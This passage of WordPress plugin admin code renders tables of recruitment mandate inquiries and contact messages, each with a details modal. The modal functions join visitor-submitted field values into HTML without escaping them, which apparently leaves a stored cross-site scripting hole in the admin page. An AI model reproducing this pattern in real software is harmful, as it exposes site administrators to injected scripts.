				<?php foreach ( $posts as $p ) : 
					$company    = get_post_meta( $p->ID, '_company', true );
					$name       = get_post_meta( $p->ID, '_name', true );
					$email      = get_post_meta( $p->ID, '_email', true );
					$phone      = get_post_meta( $p->ID, '_phone', true );
					$roles      = get_post_meta( $p->ID, '_roles', true );
					$headcount  = get_post_meta( $p->ID, '_headcount', true );
					$timeline   = get_post_meta( $p->ID, '_timeline', true );
					$budget     = get_post_meta( $p->ID, '_budget', true );
					$model      = get_post_meta( $p->ID, '_engagement_model', true );
					$location   = get_post_meta( $p->ID, '_location', true );
					$experience = get_post_meta( $p->ID, '_experience', true );
					$domain     = get_post_meta( $p->ID, '_domain', true );
					$message    = get_post_meta( $p->ID, '_message', true );

					$details_json = htmlspecialchars( json_encode( array(
						'Company Name'     => $company,
						'Contact Person'   => $name,
						'Work Email'       => $email,
						'Contact Number'   => $phone,
						'Engagement Model' => $model,
						'Industry Domain'  => $domain,
						'Roles Required'   => $roles,
						'Total Headcount'  => $headcount,
						'Joining Timeline' => $timeline,
						'Work Model / Loc' => $location,
						'Experience Band'  => $experience,
						'Budget / CTC'     => $budget,
						'Message Notes'    => $message,
					) ), ENT_QUOTES, 'UTF-8' );
				?>
				<tr>
					<td>
						<strong style="font-size:.98rem; color:#0F172A;"><?php echo esc_html( $company ); ?></strong><br>
						<span><?php echo esc_html( $name ); ?></span><br>
						<small><a href="mailto:<?php echo esc_attr( $email ); ?>"><?php echo esc_html( $email ); ?></a></small>
						<?php if ( $phone ) : ?> &bull; <small><?php echo esc_html( $phone ); ?></small><?php endif; ?>
					</td>
					<td>
						<div style="max-width:260px; word-break:break-word;">
							<strong><?php echo esc_html( $roles ); ?></strong>
						</div>
					</td>
					<td>
						<span class="sam-badge sam-badge-blue"><?php echo esc_html( $headcount ? $headcount . ' Pos' : 'N/A' ); ?></span>
					</td>
					<td>
						<span class="sam-badge sam-badge-amber"><?php echo esc_html( $timeline ); ?></span>
					</td>
					<td>
						<strong><?php echo esc_html( $budget ?: 'Flexible' ); ?></strong>
					</td>
					<td>
						<span class="sam-badge sam-badge-gray"><?php echo esc_html( $model ?: 'Direct Hiring' ); ?></span><br>
						<small style="color:#64748B;"><?php echo esc_html( $location ); ?></small>
					</td>
					<td>
						<small><?php echo esc_html( get_the_date( 'M j, Y', $p ) ); ?></small>
					</td>
					<td>
						<button type="button" class="sam-view-btn" onclick="showMandateModal('<?php echo esc_js( $company ); ?>', <?php echo esc_attr( $details_json ); ?>)">
							View Details
						</button>
					</td>
				</tr>
				<?php endforeach; ?>
			</tbody>
		</table>
	</div>

	<script>
		function showMandateModal(company, details) {
			var html = '<div class="sam-detail-grid">';
			for (var k in details) {
				if (details[k]) {
					html += '<div class="sam-detail-item"><strong>' + k + '</strong><span>' + details[k] + '</span></div>';
				}
			}
			html += '</div>';
			openSamModal('Mandate: ' + company, html);
		}
	</script>
	<?php
}

/**
 * Render Contact Table
 */
function sam_render_contact_table( $limit = -1 ) {
	$posts = get_posts( array(
		'post_type'      => 'sam_inquiry',
		'posts_per_page' => $limit,
		'post_status'    => 'any',
		'meta_key'       => '_sam_inquiry_type',
		'meta_value'     => 'contact',
		'orderby'        => 'date',
		'order'          => 'DESC',
	) );

	if ( empty( $posts ) ) {
		echo '<p style="color:#64748B; padding:18px 0;">No contact messages received yet.</p>';
		return;
	}
	?>
	<div style="overflow-x:auto;">
		<table class="sam-data-table">
			<thead>
				<tr>
					<th>Sender</th>
					<th>Inquiry Subject</th>
					<th>Message</th>
					<th>Date</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach ( $posts as $p ) : 
					$name    = get_post_meta( $p->ID, '_name', true );
					$email   = get_post_meta( $p->ID, '_email', true );
					$phone   = get_post_meta( $p->ID, '_phone', true );
					$subject = get_post_meta( $p->ID, '_subject', true );
					$message = $p->post_content;

					$details_json = htmlspecialchars( json_encode( array(
						'Sender Name'  => $name,
						'Email'        => $email,
						'Phone Number' => $phone,
						'Inquiry Type' => $subject,
						'Full Message' => $message,
					) ), ENT_QUOTES, 'UTF-8' );
				?>
				<tr>
					<td>
						<strong><?php echo esc_html( $name ); ?></strong><br>
						<small><a href="mailto:<?php echo esc_attr( $email ); ?>"><?php echo esc_html( $email ); ?></a></small>
						<?php if ( $phone ) : ?> &bull; <small><?php echo esc_html( $phone ); ?></small><?php endif; ?>
					</td>
					<td>
						<span class="sam-badge sam-badge-blue"><?php echo esc_html( $subject ); ?></span>
					</td>
					<td>
						<div style="max-width:340px; word-break:break-word; color:#475569;">
							<?php echo esc_html( wp_trim_words( $message, 18 ) ); ?>
						</div>
					</td>
					<td>
						<small><?php echo esc_html( get_the_date( 'M j, Y', $p ) ); ?></small>
					</td>
					<td>
						<button type="button" class="sam-view-btn" onclick="showContactModal('<?php echo esc_js( $name ); ?>', <?php echo esc_attr( $details_json ); ?>)">
							Read Message
						</button>
					</td>
				</tr>
				<?php endforeach; ?>
			</tbody>
		</table>
	</div>

	<script>
		function showContactModal(sender, details) {
			var html = '<div class="sam-detail-grid">';
			for (var k in details) {
				if (details[k]) {
					html += '<div class="sam-detail-item"><strong>' + k + '</strong><span>' + details[k] + '</span></div>';
				}
			}
			html += '</div>';
			openSamModal('Contact Inquiry: ' + sender, html);
		}
	</script>
	<?php
}
